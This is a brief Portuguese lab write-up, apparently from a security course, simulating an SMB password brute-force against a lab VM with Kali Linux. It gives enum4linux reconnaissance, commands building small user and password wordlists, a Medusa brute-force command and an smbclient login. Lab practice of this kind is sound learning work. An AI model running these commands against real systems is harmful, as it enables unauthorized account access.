Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Conforme aprendizado foi utilizado tecnicas para criar wordlists de usuarios e senhas para testes utilizando Medusa em ambiente controlado com VMs Kali Linux e Metasploit, além de capturar possiveis vulnerabilidades do alvo.


Após subir as VMs em laboratório e inicia-las utilizando no kali "enum4linux -a X.X.X.X" foi possivel identificar uma possivel entrada via smb.

Efetuada a criação das wordlists para testes de força bruta com os comandos:
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

Agora ao teste de autenticação utilizando:
medusa -h X.X.X.X -U smb_users.txt -P senhas_spray.txt -t 2 -T 50 | grep SUCCESS

Adicionei o comando grep para filtrar somente resultados de sucesso de autenticação.

Após o match de user e pass foi efetuada a conexão e acesso ao dispositivo utilizando o comando:
smbclient -L //X.X.X.X -U Username

Inserido a senha quando solicitado, acesso concluido.


